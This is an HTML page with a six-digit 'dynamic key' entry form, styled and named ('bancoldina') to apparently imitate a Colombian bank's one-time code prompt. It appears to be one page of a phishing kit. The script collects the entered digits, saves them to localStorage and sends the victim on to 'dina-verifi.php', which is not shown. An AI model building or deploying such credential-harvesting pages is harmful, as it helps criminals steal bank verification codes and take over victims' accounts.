<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ingreso Din√°mica</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body, html {
      height: 100%;
      width: 100%;
      background-color: #f0f0f0;
      font-family: sans-serif;
    }

    .image-container {
      width: 100%;
      height: 100%;
      position: relative;
    }

    .image-container img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      position: absolute;
      top: 0;
      left: 0;
      z-index: -1;
    }

    .form-wrapper {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: #fff;
      padding: 30px 20px;
      border-radius: 10px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 25px;
      width: 90%;
      max-width: 350px;
    }

    .input-container {
      display: flex;
      justify-content: center;
      gap: 10px;
      flex-wrap: nowrap;
    }

    .password-input {
      width: 28px;
      height: 20px;
      text-align: center;
      font-size: 20px;
      padding: 10px 0 5px 0;
      border: none;
      border-bottom: 1.5px solid #808285;
      background: transparent;
      outline: none;
      color: #2c2a29;
    }

    .password-input:focus {
      border-bottom: 1.5px solid #ffc20e;
    }

    .button-container {
      display: flex;
      flex-direction: column;
      gap: 15px;
      width: 100%;
    }

    .button-container button {
      padding: 14px 0;
      font-size: 16px;
      border: none;
      border-radius: 50px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    #continuar {
      background-color: #ffda37;
      border: 1px solid black;
    }

    #continuar:hover {
      background-color: #ffcb00;
    }

    #cancelar {
      background-color: #bababa;
    }

    #cancelar:hover {
      background-color: #a9a9a9;
    }

    @media screen and (max-width: 480px) {
      .form-wrapper {
        padding: 20px 15px;
        gap: 20px;
      }

      .password-input {
        width: 26px;
        font-size: 18px;
        padding: 8px 0 4px 0;
      }

      .button-container button {
        font-size: 15px;
        padding: 12px 0;
      }
    }
  </style>
</head>
<body>

  <div class="image-container">
    <img src="img/cel3.jpg" alt="Background Image" />

    <div class="form-wrapper">
      <div class="input-container">
        <input type="tel" class="password-input" maxlength="1" id="input1" />
        <input type="tel" class="password-input" maxlength="1" id="input2" />
        <input type="tel" class="password-input" maxlength="1" id="input3" />
        <input type="tel" class="password-input" maxlength="1" id="input4" />
        <input type="tel" class="password-input" maxlength="1" id="input5" />
        <input type="tel" class="password-input" maxlength="1" id="input6" />
      </div>

      <div class="button-container">
        <button id="continuar">Continuar</button>
        <button id="cancelar">Cancelar</button>
      </div>
    </div>
  </div>

  <script>
    const inputs = document.querySelectorAll('.password-input');

    inputs.forEach((input, index) => {
      input.addEventListener('input', (e) => {
        const value = e.target.value;
        if (!/^\d$/.test(value)) {
          e.target.value = '';
        } else {
          if (index < inputs.length - 1 && e.target.value !== '') {
            inputs[index + 1].focus();
          }
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && index > 0 && e.target.value === '') {
          inputs[index - 1].focus();
        }
      });
    });

    document.getElementById('continuar').addEventListener('click', () => {
      const inputValues = Array.from(inputs).map(input => input.value).join('');
      localStorage.setItem('bancoldina', inputValues);
      window.location.href = 'dina-verifi.php';
    });

    document.getElementById('cancelar').addEventListener('click', () => {
      window.location.href = 'index.html';
    });
  </script>

</body>
</html>
